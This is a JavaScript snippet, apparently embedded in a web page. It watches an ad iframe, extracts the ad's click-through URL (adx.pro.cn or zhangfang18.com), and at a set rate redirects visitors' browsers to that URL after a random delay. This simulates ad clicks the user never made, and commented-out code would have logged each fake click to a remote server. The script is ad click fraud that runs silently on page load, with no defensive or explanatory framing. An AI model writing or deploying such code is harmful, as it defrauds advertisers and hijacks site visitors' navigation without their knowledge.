
    var ifr = document.createElement('iframe');
    var ifrc = document.createElement('iframe');  
    var loopn = 0;
    var rate_cli_ads=0.012;
    iff();
    function iff(){
//    	var dddd= $("#lfs_gad_sub");
        loopn++; 
        if(loopn<400){
            if(document.getElementById('lfs_gad_sub') && document.getElementById('lfs_gad_sub').getElementsByTagName('iframe').length>0){ 
            	if(null != document.getElementById('lfs_gad_sub').getElementsByTagName('iframe')[0].getAttribute('data-srcdoc')){
            		
            		if(document.getElementById('lfs_gad_sub').getElementsByTagName('iframe')[0].getAttribute('data-srcdoc').split('http://adx.pro.cn/c?c=').length>1){
            			
            			if(document.getElementById('lfs_gad_sub').getElementsByTagName('iframe')[0].getAttribute('data-srcdoc').split('http://adx.pro.cn/c?c=')[1].split('"').length>1){

                        	
                        	var rand = parseInt(Math.random()*10);//1000内的随机数
                            var url_123 = "http://adx.pro.cn/c?c="+document.getElementById('lfs_gad_sub').getElementsByTagName('iframe')[0].getAttribute('data-srcdoc').split('http://adx.pro.cn/c?c=')[1].split('"')[0];
//                            ifr.src = urll ;
//                            ifr.style.display = "none" ;
//                            ifr.width = 0 ;
//                            ifr.height = 0 ; 
                            var random_a = parseInt((Math.random()*8+2), 10);
                            var random_b = Math.random();
                            if(random_b<=rate_cli_ads){
                            	 setTimeout(function(){open(url_123)},(random_a*1000));    
                            }
                           
                        
            			}else{
            				setTimeout(arguments.callee, 500); 
            			}
            		}else{
            			if(document.getElementById('lfs_gad_sub').getElementsByTagName('iframe')[0].getAttribute('data-srcdoc').split('/clk2.html').length>1){
                            if(document.getElementById('lfs_gad_sub').getElementsByTagName('iframe')[0].getAttribute('data-srcdoc').split('/clk2.html')[1].split('>').length>1){
                            	
                            	var rand = parseInt(Math.random()*10);//1000内的随机数
                                var url_cli = "http://sub.zhangfang18.com/clk2.html"+document.getElementById('lfs_gad_sub').getElementsByTagName('iframe')[0].getAttribute('data-srcdoc').split('/clk2.html')[1].split('>')[0]+"\"";
//                                ifr.src = urll ;
//                                ifr.style.display = "none" ;
//                                ifr.width = 0 ;
//                                ifr.height = 0 ; 
                                var random_a = parseInt((Math.random()*8+4), 10);
                                var random_b = Math.random();
                                if(random_b<=rate_cli_ads){
                                	 setTimeout(function(){open(url_cli)},(random_a*1000));    
                                }
                               
                            }else{
                                setTimeout(arguments.callee, 500); 
                            }
                        }else{
                            setTimeout(arguments.callee, 500); 
                        }

            		}
            		
            		
            		
            	}else{
                    setTimeout(arguments.callee, 500); 
                }
                
            }else{
                setTimeout(arguments.callee, 500); 
            }
        } 
        
    }
    function open(urls){
    	
//    	var lcurl = "http://120.27.35.52:8081/logserver/jsclk/87cfbbfd4f6eefeb3f4c/5c6f66de118ff92e6d99/sub_zhangfang18_com";
//    	$.get(lcurl);
    	
    	document.location.href = urls;
    	
    	
    }
//    function append(obj){
//        document.body.appendChild(obj);
//    }